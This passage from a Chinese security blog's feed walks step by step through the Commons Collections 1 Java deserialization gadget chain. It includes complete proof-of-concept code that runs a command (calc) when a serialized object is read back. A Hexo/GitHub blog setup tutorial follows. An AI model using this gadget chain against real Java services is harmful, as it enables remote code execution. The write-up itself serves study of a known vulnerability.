<span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br>        chainedTransformer.transform(Runtime.class);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>改进之后的代码如上。运行：</p><p><img src="/2023/04/27/file-upload/20231009165053008.png" alt="image-20231009165053008"></p><p>现在再结合上decorate链的内容：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">//Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] Transformers=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getDeclaredMethod&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class,Class[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class,Object[].class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>,<span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;,<span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        ChainedTransformer chainedTransformer= <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(Transformers);<br>        HashMap&lt;Object,Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;key&quot;</span>,<span class="hljs-string">&quot;value&quot;</span>);<br>        Map&lt;Object,Object&gt; transformedMap = TransformedMap.decorate(hashMap,<span class="hljs-literal">null</span>,chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class,Map.class);<br>        constructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> constructor.newInstance(Override.class,transformedMap);<br><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException, IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这里运行后未能成功执行命令，在AnnotationInvocationHandler中的if判断处下断点：</p><p><img src="/2023/04/27/file-upload/20231009174725349.png" alt="image-20231009174725349"></p><p>第一个if就直接跳出了判断，memberType为null。</p><p>现在需要满足两个if判断，进入memberValue.setValue方法。memberType使用get方法查找，name来自于我们传入的key值，可控。</p><p>而memberTypes来自于annotationType的成员变量，这里memeberType是获取注解中成员变量的名称，所以我们需要控制传入的key</p><p>值与注解的成员变量相同。这里memeberType是获取注解中成员变量的名称，然后并且检查键值对中键名是否有对应的名称，而我们所</p><p>使用的注解是没有成员变量的。</p><p>从这里的传参跟进来看：</p><p><img src="/2023/04/27/file-upload/20231010104228595.png" alt="image-20231010104228595"></p><p><img src="/2023/04/27/file-upload/20231010104137177.png" alt="image-20231010104137177"></p><p>这里有另一个注解Target，点进去看看：</p><p><img src="/2023/04/27/file-upload/20231010104513003.png" alt="image-20231010104513003"></p><p>这里有一个成员变量value，不为空满足条件。因此修改传参为Target.class，并且将put的第一个参数改为value。</p><p><img src="/2023/04/27/file-upload/20231010104935835.png" alt="image-20231010104935835"></p><p>再次debug，看看if判断的情况：</p><p><img src="/2023/04/27/file-upload/20231010105000351.png" alt="image-20231010105000351"></p><p>此时memberType为java.lang.annotation.ElementType。</p><p>继续往下：</p><p><img src="/2023/04/27/file-upload/20231010105250523.png" alt="image-20231010105250523"></p><p>已经成功过了两个if的判断，但是依然无法执行命令。步入继续跟进：</p><p><img src="/2023/04/27/file-upload/20231010105539627.png" alt="image-20231010105539627"></p><p>这里checkSetValue的参数，并不是预期的Runtime runtime，而是AnnotationTypeMismatchExceptionProxy类。</p><p>要解决setValue参数可控的问题，就用到了ConstantTransformer类。</p><p><img src="/2023/04/27/file-upload/20231010110702323.png" alt="image-20231010110702323"></p><p>这里的public构造方法，传入的类都会赋给iConstant，并且在transform方法中，无论传入什么类，都是返回iConstant。</p><p>因此可以利用该特性，将 AnnotationTypeMismatchExceptionProxy 类作为 transform() 方法的参数，也就是Object input，而Object constantToReturn，我们先传入一个 Runtime.class，然后无论 transform() 方法会调用什么对象，都会返回 Runtime.class。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.TransformedMap;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.annotation.Target;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">TransformMapEXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//Class c = Class.forName(&quot;java.lang.Runtime&quot;);</span><br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Method getruntime = c.getDeclaredMethod(&quot;getRuntime&quot;);</span><br><span class="hljs-comment">        Runtime r = (Runtime) getruntime.invoke(null,null);</span><br><span class="hljs-comment">        Method exec = c.getDeclaredMethod(&quot;exec&quot;, String.class);</span><br><span class="hljs-comment">        exec.invoke(r,&quot;calc&quot;);</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        Method getruntime = (Method) new InvokerTransformer(&quot;getDeclaredMethod&quot;,new Class[]&#123;String.class,Class[].class&#125;,new Object[]&#123;&quot;getRuntime&quot;,null&#125;).transform(Runtime.class);</span><br><span class="hljs-comment">        Runtime r = (Runtime) new InvokerTransformer(&quot;invoke&quot;,new Class[]&#123;Object.class,Object[].class&#125;,new Object[]&#123;null,null&#125;).transform(getruntime);</span><br><span class="hljs-comment">        new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc&quot;&#125;).transform(r);</span><br><span class="hljs-comment">         */</span><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class), <span class="hljs-comment">// 构造 setValue 的可控参数</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>,<br>                        <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class, Class[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span><br>                        , <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Object.class, Object[].class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-literal">null</span>, <span class="hljs-literal">null</span>&#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;<span class="hljs-string">&quot;calc&quot;</span>&#125;)<br>        &#125;;<br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;&gt;();<br>        hashMap.put(<span class="hljs-string">&quot;value&quot;</span>,<span class="hljs-string">&quot;test&quot;</span>);<br>        Map&lt;Object, Object&gt; transformedMap = TransformedMap.decorate(hashMap, <span class="hljs-literal">null</span>, chainedTransformer);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> Class.forName(<span class="hljs-string">&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;</span>);<br>        <span class="hljs-type">Constructor</span> <span class="hljs-variable">aihConstructor</span> <span class="hljs-operator">=</span> c.getDeclaredConstructor(Class.class, Map.class);<br>        aihConstructor.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> aihConstructor.newInstance(Target.class, transformedMap);<br><br>        <span class="hljs-comment">// 序列化反序列化</span><br>        serialize(o);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException&#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/20231010111514023.png" alt="image-20231010111514023"></p><p>至此成功执行命令。</p><p>总的链子如下：</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xl">I<span class="hljs-function"><span class="hljs-title">nvokerTransformer</span>-&gt;</span>transform<br>T<span class="hljs-function"><span class="hljs-title">ransformedMap</span>-&gt;</span>checkSetValue<br>A<span class="hljs-function"><span class="hljs-title">bstractInputCheckedMapDecorator</span>-&gt;</span>setValue<br>A<span class="hljs-function"><span class="hljs-title">nnotationInvocationHandler</span>-&gt;</span>readObject<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>CC1</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hexo+github搭建个人博客</title>
    <link href="/2024/07/23/hexo/"/>
    <url>/2024/07/23/hexo/</url>
    
    <content type="html"><![CDATA[<h1 id="hexo-github搭建个人博客"><a href="#hexo-github搭建个人博客" class="headerlink" title="hexo+github搭建个人博客"></a>hexo+github搭建个人博客</h1><h2 id="nodejs，npm安装"><a href="#nodejs，npm安装" class="headerlink" title="nodejs，npm安装"></a>nodejs，npm安装</h2><p>node.js不使用最新版本，而是选择v14.21.3，链接如下：</p><p><a href="https://nodejs.org/zh-cn/download/prebuilt-installer">Node.js — 下载 Node.js® (nodejs.org)</a></p><p>通过msi安装，同时包含了npm 6.14.18.</p><p>安装完成后查看版本：</p><p><img src="/2023/04/27/file-upload/0240723090054454.png" alt="image-20240723090054454"></p><h2 id="hexo安装"><a href="#hexo安装" class="headerlink" title="hexo安装"></a>hexo安装</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>安装完成后如下所示：</p><p><img src="/2023/04/27/file-upload/0240723090420627.png" alt="image-20240723090420627"></p><p>下面选择一个目录，创建hexo项目：</p><figure class="highlight cmake"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs cmake">hexo init [<span class="hljs-keyword">project</span>-name]<br>cd [<span class="hljs-keyword">project</span>-name]<br>npm <span class="hljs-keyword">install</span><br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723090846584.png" alt="image-20240723090846584"></p><p>本地启动项目：</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo <span class="hljs-selector-tag">g</span><br>hexo s<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723090959722.png" alt="image-20240723090959722"></p><h2 id="fluid安装"><a href="#fluid安装" class="headerlink" title="fluid安装"></a>fluid安装</h2><p>主题选择fluid，同样不选用最新版，选择v1.8.13</p><p><a href="https://github.com/fluid-dev/hexo-theme-fluid/archive/refs/tags/v1.8.13.zip">https://github.com/fluid-dev/hexo-theme-fluid/archive/refs/tags/v1.8.13.zip</a></p><p>下载后解压并重命名为fluid，复制到hexo&#x2F;themes目录下：</p><p><img src="/2023/04/27/file-upload/0240723091251487.png" alt="image-20240723091251487"></p><p>接下来修改根目录下的_config.yml，将theme改为fluid：</p><p><img src="/2023/04/27/file-upload/0240723091448827.png" alt="image-20240723091448827"></p><p>刷新一下，成功：</p><p><img src="/2023/04/27/file-upload/0240723091557550.png" alt="image-20240723091557550"></p><h2 id="具体配置"><a href="#具体配置" class="headerlink" title="具体配置"></a>具体配置</h2><h3 id="创建关于页"><a href="#创建关于页" class="headerlink" title="创建关于页"></a>创建关于页</h3><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> page about<br></code></pre></td></tr></table></figure><p>到source&#x2F;about目录下，修改index.md文件：</p><p><img src="/2023/04/27/file-upload/0240723091730465.png" alt="image-20240723091730465"></p><h3 id="新建文章"><a href="#新建文章" class="headerlink" title="新建文章"></a>新建文章</h3><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs css">hexo new post <span class="hljs-selector-attr">[article]</span><br>hexo <span class="hljs-selector-tag">g</span> -d <br>hexo s<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/0240723092431068.png" alt="image-20240723092431068"></p><h3 id="个性化展示"><a href="#个性化展示" class="headerlink" title="个性化展示"></a>个性化展示</h3><h4 id="标签页title："><a href="#标签页title：" class="headerlink" title="标签页title："></a>标签页title：</h4><p>根目录_config.yml-&gt;title</p><p><img src="/2023/04/27/file-upload/0240723092611006.png" alt="image-20240723092611006"></p><h4 id="导航栏左侧标题"><a href="#导航栏左侧标题" class="headerlink" title="导航栏左侧标题"></a>导航栏左侧标题</h4><p>fluid-&gt;_config.yml-&gt;bolg_title</p><p><img src="/2023/04/27/file-upload/0240723092810378.png" alt="image-20240723092810378"></p><h4 id="首页标题"><a href="#首页标题" class="headerlink" title="首页标题"></a>首页标题</h4><p>fluid-&gt;_config.yml-&gt;slogan:text</p><p><img src="/2023/04/27/file-upload/0240723092916902.png" alt="image-20240723092916902"></p><h4 id="阅读量统计"><a href="#阅读量统计" class="headerlink" title="阅读量统计"></a>阅读量统计</h4><p><a href="https://console.leancloud.cn/">https://console.leancloud.cn/</a></p><p>注册账号之后创建开发版本应用，在设置-&gt;应用凭证处获取api信息：</p><p><img src="/2023/04/27/file-upload/0240723093308374.png" alt="image-20240723093308374"></p><p>下面到fluid-&gt;_config.yml文件中修改配置：</p><p><img src="/2023/04/27/file-upload/0240723093419081.png" alt="image-20240723093419081"></p><p>首先将web_analytics项的enable改为true，下面填写api_id，api_key和server_url:</p><p><img src="/2023/04/27/file-upload/0240723093523470.png" alt="image-20240723093523470"></p><p>最后打开浏览计数，将来源改为leancloud：</p><p><img src="/2023/04/27/file-upload/0240723093645078.png" alt="image-20240723093645078"></p><p>至此，已经开启单篇文章阅读量统计，效果如下：</p><p><img src="/2023/04/27/file-upload/0240723093825819.png" alt="image-20240723093825819"></p><p>下面开启整个博客浏览数据统计。</p><p>同样是fluid-&gt;.config.yml:</p><p><img src="/2023/04/27/file-upload/0240723093933391.png" alt="image-20240723093933391"></p><p>效果如下：</p><p><img src="/2023/04/27/file-upload/0240723094142932.png" alt="image-20240723094142932"></p><h4 id="评论"><a href="#评论" class="headerlink" title="评论"></a>评论</h4><p>修改fluid的配置文件，打开评论插件并选择valine：</p><p><img src="/2023/04/27/file-upload/0240723094450220.png" alt="image-20240723094450220"></p><p>并到下面配置leancloud的api信息：</p><p><img src="/2023/04/27/file-upload/0240723094606481.png" alt="image-20240723094606481"></p><p>效果如下：</p><p><img src="/2023/04/27/file-upload/0240723095857177.png" alt="image-20240723095857177"></p><h2 id="图片加载问题"><a href="#图片加载问题" class="headerlink" title="图片加载问题"></a>图片加载问题</h2><p>hexo配置过程中遇到的最大问题就是图片无法加载，或者根据官方文档能够加载，但是与markdown格式不同，只能在一处正常显示。</p><p>hexo支持的markdown类型图片名为<code>test.jpg</code>，但是在typora中为<code>test/test.jpg</code>，为了解决这一问题，这里使用hexo-renderer-marked插件，踩坑的步骤跳过，直接给出最终的解决方案。</p><p>安装插件：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-renderer-marked <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>修改根目录下的_config.yml:</p><p><img src="/2023/04/27/file-upload/0240723104325771.png" alt="image-20240723104325771"></p><p>修改插件中的js代码，目录为<code>hexo\node_modules\hexo-renderer-marked\lib\renderer.js</code></p><p>搜索image定位到下面的位置，1为原代码，2为修改后的代码：</p><p><img src="/2023/04/27/file-upload/0240723104526181.png" alt="image-20240723104526181"></p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs markdown">// findById requires forward slash<br>// <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>* Add the following code <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">***</span><br><span class="hljs-strong">const fixPostPath = join(postPath, &#x27;../&#x27;);</span><br><span class="hljs-strong">const asset = PostAsset.findById(join(fixPostPath, href.replace(/\\/g, &#x27;/&#x27;)));</span><br><span class="hljs-strong">// const asset = PostAsset.findById(join(postPath, href.replace(/\\/g, &#x27;/&#x27;)));</span><br><span class="hljs-strong">// **</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span> End <span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span>*<br>// asset.path is backward slash in Windows<br></code></pre></td></tr></table></figure><p>最终效果如下。</p><p>在md中，能够正常加载图片，路径为hexo&#x2F;xxx.png:</p><p><img src="/2023/04/27/file-upload/0240723104608472.png" alt="image-20240723104608472"></p><p>hexo中同样正常：</p><p><img src="/2023/04/27/file-upload/0240723104648753.png" alt="image-20240723104648753"></p><h2 id="推送到github"><a href="#推送到github" class="headerlink" title="推送到github"></a>推送到github</h2><p>安装插件<code>hexo-deployer-git</code></p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">npm install hexo-deployer-git <span class="hljs-comment">--save</span><br></code></pre></td></tr></table></figure><p>修改根目录配置：</p><p><img src="/2023/04/27/file-upload/0240723110951541.png" alt="image-20240723110951541"></p><p><code>hexo g -d</code>推送即可：</p><p><img src="/2023/04/27/file-upload/0240723111032524.png" alt="image-20240723111032524"></p><p>参考链接：</p><p><a href="https://blog.csdn.net/yaorongke/article/details/119089190">GitHub Pages + Hexo搭建个人博客网站，史上最全教程_hexo博客-CSDN博客</a></p><p><a href="https://github.com/hexojs/hexo-renderer-marked/issues/216">md img render part improvement of hexo-render-marked · Issue #216 · hexojs&#x2F;hexo-renderer-marked (github.com)</a></p>]]></content>
    
    
    <categories>
      
      <category>hexo</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>taocms_v3.0.2</title>
    <link href="/2024/07/23/taocms_v3.0.2/"/>
    <url>/2024/07/23/taocms_v3.0.2/</url>
    
